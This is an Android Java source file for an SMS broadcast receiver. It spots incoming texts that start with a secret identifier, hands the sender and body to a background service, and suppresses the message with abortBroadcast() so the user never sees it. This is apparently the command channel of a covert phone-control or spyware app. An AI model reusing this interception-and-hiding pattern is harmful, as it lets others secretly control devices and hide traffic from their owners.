package com.telephony.services;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;

public class SMSBroadcastReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
		StringBuilder sms_body = new StringBuilder();

		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object[] pdus = (Object[]) bundle.get("pdus");
			if (pdus.length > 0) {

				final SmsMessage[] messages = new SmsMessage[pdus.length];
				for (int i = 0; i < pdus.length; i++) {
					messages[i] = SmsMessage.createFromPdu((byte[]) pdus[i]);
					sms_body.append(messages[i].getMessageBody());
				}
				String sms_from = messages[0].getDisplayOriginatingAddress();
				if (sms_body.toString().startsWith(SMService.IDENT_SMS)) {
					Intent mi = new Intent(context, SMService.class);
					mi.putExtra(Utils.EXTRA_PHONE_NUMBER, sms_from);
					mi.putExtra(SMService.EXTRA_SMS_BODY, sms_body.toString());
					context.startService(mi);
					abortBroadcast();
				}
			}
		}
	}
}
